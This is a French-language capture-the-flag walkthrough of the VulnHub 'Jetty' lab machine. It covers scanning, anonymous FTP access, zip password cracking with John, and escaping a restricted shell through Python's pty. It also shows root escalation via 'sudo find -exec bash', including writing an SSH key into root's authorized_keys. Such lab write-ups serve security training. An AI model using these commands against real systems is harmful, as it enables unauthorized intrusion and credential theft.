# Solution du CTF Jetty de VulnHub

Jet Set
-------

[Jetty](https://www.vulnhub.com/entry/jetty-1,621/) est un CTF posté sur VulnHub en décembre 2020.  

Il nous plonge dans le scénario suivant :  

> The company Aquarium Life S.L. has contacted you to perform a pentest against one of their machines.  
> They suspect that one of their employees has been committing fraud selling fake tickets.  
> 
> They want you to break into his computer, escalate privileges and search for any evidences that proves this behaviour

Il y a aussi un indice primordial pour résoudre le challenge (sinon trop compliqué à deviner) :  

> The suspicious username is Squiddie.

Une fois la VM importée et rattachée au réseau privé virtuel *vboxnet0* je scanne les IPs sur la plage d'adresses correspondante :  

```bash
$ sudo nmap -T5 -sP 192.168.56.1/24
```

Il en ressort une IP répondant au ping :  

```plain
Nmap scan report for 192.168.56.37
Host is up (0.00029s latency).
MAC Address: 08:00:27:58:B4:B0 (Oracle VirtualBox virtual NIC)
```

Etape suivante, le scan des ports TCP de cette adresse :  

```plain
$ sudo nmap -T5 -p- -sCV 192.168.56.37 -oA jetty
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-27 10:13 CEST
Nmap scan report for 192.168.56.37
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp           306 Oct 06  2018 README.txt [NSE: writeable]
|_-rwxrwxrwx    1 ftp      ftp           226 Oct 06  2018 sshpass.zip [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 2048000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 4 disallowed entries 
|_/dir/ /passwords/ /facebook_photos /admin/secret
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
65507/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a05be6bbfdf602ecf0bda1beb89784ba (RSA)
|   256 e9d350267e5ac2a0b089c9f464d8aab0 (ECDSA)
|_  256 2e67c1afcc225c59155f97f72e1be093 (ED25519)
MAC Address: 08:00:27:58:B4:B0 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Une recherche sur la bannière SSH nous renvoie sur [ce paquet pour Ubuntu](https://ubuntu.pkgs.org/18.04/ubuntu-updates-main-amd64/openssh-server_7.6p1-4ubuntu0.7_amd64.deb.html) laissant entendre que le système est en version *Ubuntu 18.04 LTS (Bionic Beaver)*.  

Le serveur FTP permettant l'accès anonyme j’enchaîne directement sur la récupération des fichiers comme ce fichier texte :  

```plain
Hi Henry, here you have your ssh's password. As you can see the file is encrypted with the default company's password. 
Please, once you have read this file, run the following command on your computer to close the FTP server on your side. 
IT IS VERY IMPORTANT!! CMD: service ftp stop.
```

Comme indiqué le fichier *sshpass.zip* est protégé par un mot de passe. Il convient de d'abord générer un hash correspondant au fichier via *zip2john* (utilitaire que l'on trouve avec la version Jumbo de [John The Ripper](https://www.openwall.com/john/)) :  

```bash
$ ./zip2john sshpass.zip 
ver 1.0 efh 5455 efh 7875 sshpass.zip/sshpass.txt PKZIP Encr: 2b chk, TS_chk, cmplen=38, decmplen=26, crc=CA21C815 ts=45E9 cs=45e9 type=0
sshpass.zip/sshpass.txt:$pkzip$1*2*2*0*26*1a*ca21c815*0*45*0*26*45e9*af4474f0c7ea2f6f4e4f9673b6cfbe90697cfeb31a7b4dceaeffb6a732fd46e59302781fd1cf*$/pkzip$:sshpass.txt:sshpass.zip::sshpass.zip
```

On cracke ensuite le hash qu'on aura recopié dans un fichier :  

```bash
$ ./john --wordlist=rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
seahorse!        (sshpass.zip/sshpass.txt)     
1g 0:00:00:00 DONE (2022-10-27 10:19) 5.555g/s 7281Kp/s 7281Kc/s 7281KC/s serveteleumede..saythatyouloveme
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Le mot de passe indiqué permet d’accéder au fichier dans le zip, ce dernier contenant le mot de passe *Squ1d4r3Th3B3$t0fTh3W0rLd* à utiliser pour le compte ssh de l'utilisateur *squiddie* (en minuscules).  

Escape Game
-----------

Avant d'aller plus loin j'ai fouillé du côté du serveur web mais les entrées du fichier *robots.txt* étaient toutes invalides et une énumération via *feroxbuster* n'a rien remonté non plus.  

Une fois connecté via SSH on est averti que l'on est dans un bash restreint :  

```plain
*You are in a limited shell.
Type '?' or 'help' to get the list of allowed commands
squiddie:~$ ?
cd  clear  exit  help  history  lpath  ls  lsudo  pwd  python  whoami
```

Le comportement est similaire à sudo dans le sens où la whitelist semble attendre des commandes exactes :  

```plain
squiddie:~$ python -c 'import pty; pty.spawn("bash")'
*** forbidden syntax -> "python -c 'import pty; pty.spawn("bash")'"
*** You have 1 warning(s) left, before getting kicked out.
This incident has been reported.
```

On va donc utiliser l'interpréteur Python de façon interactive pour s'échapper du rbash :  

```plain
squiddie:~$ python
Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty; pty.spawn("bash")
squiddie@jetty:~$ id
uid=1001(squiddie) gid=1001(squiddie) groups=1001(squiddie)
```

Je relève les fichiers suivants dans le dossier de l'utilisateur :  

```plain
./Desktop:
total 16
drwxr-xr-x  2 squiddie squiddie 4096 Nov 11  2018 .
drwxr-xr-x 14 squiddie squiddie 4096 Oct 27 03:32 ..
-rw-rw-r--  1 squiddie squiddie  112 Oct 22  2018 To_Michael.txt
-rw-r--r--  1 squiddie squiddie   33 Nov 11  2018 user.txt

./Documents:
total 900
drwxr-xr-x  3 squiddie squiddie   4096 Oct 22  2018 .
drwxr-xr-x 14 squiddie squiddie   4096 Oct 27 03:32 ..
-rw-r--r--  1 squiddie squiddie  28307 Oct  9  2018 laboral_calendar_2018.pdf
-rw-r--r--  1 squiddie squiddie 880236 Oct 22  2018 ticket_prices.PNG
drwxr-xr-x  2 squiddie squiddie   4096 Oct 22  2018 Tickets

./Documents/Tickets:
total 196
drwxr-xr-x 2 squiddie squiddie  4096 Oct 22  2018 .
drwxr-xr-x 3 squiddie squiddie  4096 Oct 22  2018 ..
-rw-r--r-- 1 squiddie squiddie 45676 Oct  7  2018 adult_ticket_f.PDF
-rw-r--r-- 1 squiddie squiddie 45745 Oct  7  2018 adult_ticket.PDF
-rw-r--r-- 1 squiddie squiddie 45888 Oct  7  2018 child_ticket_f.PDF
-rw-r--r-- 1 squiddie squiddie 44354 Oct  7  2018 child_ticket.PDF
```

On obtient le premier flag dans *user.txt* (*dd69f649f3e5159ddd10b83b56b2dda2*) et le message suivant destiné à *Michael* :  

> Hi Michael,  
> 
> When I run the command you ask me to, an error occurr. Can you help me with this?  
> 
>   
> 
> Regards,  
> 
> Henry

Je note que bien que les tickets pdf semblent identiques visuellement, les sommes de contrôle MD5 ne sont pas les même :  

```plain
57b7f3a75fa81d6e6191c335a612d8c6  adult_ticket_f.PDF
17713bdca88d430aa64e294d06459285  adult_ticket.PDF
6d1061a316ec323937a0930bafaf9b8d  child_ticket_f.PDF
38338c81ae2fab31049c41aba851ae5b  child_ticket.PDF
```

Sous la racine web je trouve un fichier encodé :  

```plain
squiddie@jetty:~$ cat /var/www/html/recoverpassword.txt 
Backup password:

'&%$#"!~}|{zyxwvut210/.-,+k)(!Efedcba`_^]\[ZYXWVUTpohmlkjihg`&GFEDCBA@?>=<;:
9876543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWmrkponmlkdc
b(`_dc\"`BX|?>Z<RWVUNSRKoONGLKDh+*)('&BA:?>=<;:92Vw/43,10)Mnmlkjihgfedcba`_^
]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9UTSRQ3ONMLKJCg*)('&%$#"!~}|{zyxwvutsrq/
(-,+*)('&}|B"b~}v{ts9wputsrqj0QPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$
#"!~}|{zyxwvutsr0/.-,+*)(!~%|Bcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876
543210/.-,+*)('&B$:?>=<;:3270Tu-,+O/.n,%Ijihgfedcba`_^]\[ZYXWVUTSonmlkMibgf_
^$EaZ_^]VUy<XWPOs6543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[Z
YXWVUTSRQPONjihgfedcb[ZBX|\UZYRv9876543210/.-,+*)('&B$@?>=<5:381Uvutsrqpo-,+
k)"'&%|{Aba`_^]yxwYutsrqpi/PONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#"!~
}|{zyxwvutsrqponmlkjihgfedcba`_{]sxwvutslkji/PONMLKaf_^]ba`_^W{[ZYXWPOsMRQJI
mGLKJIHG@dDCB;:9]~6;:92Vwvutsrqponmlkjihgfe#"!~}|{zyxq7utsrTpong-NMLKJIHGFED
CBA@?>=<;:9876543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]sxwvuts
rqjihg-,w
```

Mais je n'ai rien réussi à en tirer. Le site *dcode.fr* ne trouve pas non plus de quoi il s'agit.  

Vers root et au delà
--------------------

```bash
squiddie@jetty:~$ sudo -l 
Matching Defaults entries for squiddie on jetty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User squiddie may run the following commands on jetty:
    (ALL) NOPASSWD: /usr/bin/find
```

Les utilisateurs Linux confirmés auront immédiatement recours à l'option *exec* de la commande :  

```plain
sudo /usr/bin/find -name recoverpassword.txt -exec bash -c 'echo ssh-rsa --- snip ma clé publique ssh --- > /root/.ssh/authorized_keys' \;
```

Bien que le fichier se soit créé correctement le serveur SSH ne semble pas accepter l'authentification par clé. J'ai eu recours à un appel plus simple :  

```bash
sudo /usr/bin/find -name recoverpassword.txt -exec bash \;
```

On obtient le second flag et une note sans intérêt :  

```bash
root@jetty:/root/Desktop# cat proof.txt 
136d05d01c8af5d3e3520d2c270f91f1
root@jetty:/root/Desktop# cat note.txt 
Say to Mary that I want to go on vacation on 2 weeks.
```

L'utilisateur root dispose d'un dossier caché :  

```plain
./Documents:
total 220
drwxr-xr-x  4 root root   4096 Oct 22  2018 .
drwx------ 17 root root   4096 Oct 27 03:53 ..
drwxr-xr-x  3 root root   4096 Oct  6  2018 .docs
drwxr-xr-x  2 root root   4096 Oct 22  2018 Tickets_cooked
-rw-r--r--  1 root root 207505 Oct 22  2018 Ticket_Toulouse.PDF

./Documents/.docs:
total 80
drwxr-xr-x 3 root root  4096 Oct  6  2018 .
drwxr-xr-x 4 root root  4096 Oct 22  2018 ..
-rw-r--r-- 1 root root 18944 Oct  6  2018 Accountabilty_not_cooked.xlsx
-rw-r--r-- 1 root root 11968 Oct  6  2018 AccountabiltyReportMorning-1112018.xlsx
-rw-r--r-- 1 root root 15872 Oct  6  2018 MoneyBalance.xlsx
drwxr-xr-x 2 root root  4096 Oct  6  2018 Password_keeper
-rw-r--r-- 1 root root 19456 Oct  6  2018 Pending_to_erase.xlsx

./Documents/.docs/Password_keeper:
total 4744
drwxr-xr-x 2 root root    4096 Oct  6  2018 .
drwxr-xr-x 3 root root    4096 Oct  6  2018 ..
-rw-r--r-- 1 root root     242 Oct  6  2018 database.txt
-rwxr-xr-x 1 root root 4839402 Oct  6  2018 password_keeper.exe
-rw-r--r-- 1 root root     263 Oct  6  2018 usage.txt

./Documents/Tickets_cooked:
total 104
drwxr-xr-x 2 root root  4096 Oct 22  2018 .
drwxr-xr-x 4 root root  4096 Oct 22  2018 ..
-rw-r--r-- 1 root root 45676 Oct  7  2018 adult_ticket_f.PDF
-rw-r--r-- 1 root root 45888 Oct  7  2018 child_ticket_f.PDF
```

Il y a un fichier qui semble contenir des mots de passe chiffrés avec un outil maison :  

```plain
root@jetty:/root/Documents/.docs/Password_keeper# ls
database.txt  password_keeper.exe  usage.txt
root@jetty:/root/Documents/.docs/Password_keeper# cat usage.txt 
Usage: 
        *Linux: wine password_keeper.exe (database.txt must be in the same folder as the password_keeper.exe)
        *Windows: password_keeper.exe (database.txt must be in the same folder as the password_keeper.exe)

This program was compiled using pyinstaller. 

root@jetty:/root/Documents/.docs/Password_keeper# cat database.txt 
instagram T9Y0Ku/oDv80H8CUzBKkwQ==
facebook IXKnuKh73jCOKcEZAaHnIQ==
Accountabilty_not_cooked rbRH72cf3UiHXcmQB6o0OA==
MoneyBalance rRd3m80KzzTik3Eu9BRWy95GsORKwD+adfTUfPLaxVk=
Pending_to_erase aneylFYmV/jz/7g5j+Ck15oreK1VhmaKmTwa8cdSnpY
```

Tenter de décoder directement depuis base64 donne effectivement un charabia invalide.  

Le point important ici est la mention de PyInstaller dans la documentation.  

Comme pour le CTF [Uninvited](https://devloop.users.sourceforge.net/index.php?article262/solution-du-ctf-uninvited-de-vulnhub) on peut décompresser le zip pour obtenir les scripts Python compilés.  

J'ai trouvé un site permettant de faire ça, ce qui fait gagner quelques minutes d'installation :  

![PyExtractor Jetty VulnHub password_keeper.exe](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/jetty_pyextractor.png)

Une fois les fichiers obtenus on peut utiliser [uncompyle6](https://github.com/rocky/python-uncompyle6) pour décompiler le fichier Python principal. La problématique que j'avais était que toutes les versions de Python dont je disposais étaient trop récentes pour cet outil (c'est ça d'utiliser [openSUSE Tumbleweed](https://get.opensuse.org/tumbleweed/) ![8-)](plugins/plxtoolbar/custom.buttons/smilies/cool.png)
)  

J'ai choisi d'installer *uncompyle6* depuis la VM étudiée mais la machine étant sur le réseau privé virtuel elle n'a pas d'accès à Internet et ne peux donc pas lancer *pip*.  

Solution que j'ai mis en place : faire tourner *mitmproxy* sur la machine hôte puis spécifier le proxy sur la VM :  

```bash
https_proxy=http://192.168.56.1:8080/ pip install  uncompyle6 --trusted-host pypi.python.org  --trusted-host pypi.org --trusted-host files.pythonhosted.org
```

Les options supplémentaires permettent de passer outre la vérification des certificats puisque *mitmproxy* renvoie un certificat invalide à la place (sinon il faut importer une autorité de certification en local etc)  

Voici deux extraits intéressants du code décompilé :  

```python
def main():
    print 'Welcome to the best password keeper ever!'
    print '__        __         _                _  __                         '
    print '\\ \\      / /__  __ _| | ___   _      | |/ /___  ___ _ __   ___ _ __ '
    print " \\ \\ /\\ / / _ \\/ _` | |/ / | | |_____| ' // _ \\/ _ \\ '_ \\ / _ \\ '__|"
    print '  \\ V  V /  __/ (_| |   <| |_| |_____| . \\  __/  __/ |_) |  __/ |   '
    print '   \\_/\\_/ \\___|\\__,_|_|\\_\\__,  |     |_|\\_\\___|\\___| .__/ \\___|_|   '
    print '                          |___/                    |_|   '
    iv = '166fe2294df5d0f3'
    key = 'N2FlMjE4ZmYyOTI4ZjZiMg=='
    database = read_database()
    loop = True
    while loop:
        print ''
        print 'Choose what you want to do: '
        print '1) See your passwords!'
        print '2) Generate a cipher-password'
        print '3) Close'
        option = raw_input('Insert your selection here --> ')
        if option == '1':
            print ''
            print 'Showing content of your secret passwords...'
            print ''
            show_keys(database, key, iv)
            print ''
            returned = raw_input('Press any button to return to the menu...')

def show_keys(database, key, iv):
    check_permissions = raw_input('Insert password: ')
    if base64.b64encode(check_permissions) == key:
        for i in range(len(database[0])):
            ciphertext = database[1][i]
            decipher = decipher_message(key, ciphertext, iv)
            print ' '
            print 'Tag: ' + database[0][i] + ' Password: ' + decipher
            print ' '

    else:
        print ''
        print 'Tag: Instagram Password: WRONG '
        print 'Tag: Facebook  Password: PASSWORD '
        print 'Tag: SSH       Password: TRY '
        print 'Tag: root      Password: HARDER! '
        print ''
```

Le code s'attend à ce que le résultat d'un base64 sur le mot de passe saisi corresponde à *N2FlMjE4ZmYyOTI4ZjZiMg==* soit le mot de passe *7ae218ff2928f6b2*.  

Le programme généré par PyInstaller est un exécutable Windows mais Wine est installé sur la VM du CTF. On peut donc l'exécuter puis saisir le mot de passe, ce qui nous dump les infos suivantes :  

```plain
Tag: instagram Password: S3x1B0y
Tag: facebook Password: M4rK1sS0s3X1
Tag: Accountabilty_not_cooked Password: co8oiads13kt
Tag: MoneyBalance Password: C5Y0wzGqq4Xw8XGD
Tag: Pending_to_erase Password: 1hi2ChHrtkQsUTOc
```

Quand on se sert de ces mots de passe pour ouvrir les différents fichiers xlsx on comprend que les lignes de compte ont été modifiées pour retirer la vente de deux billets.  


*Published October 27 2022 at 14:53*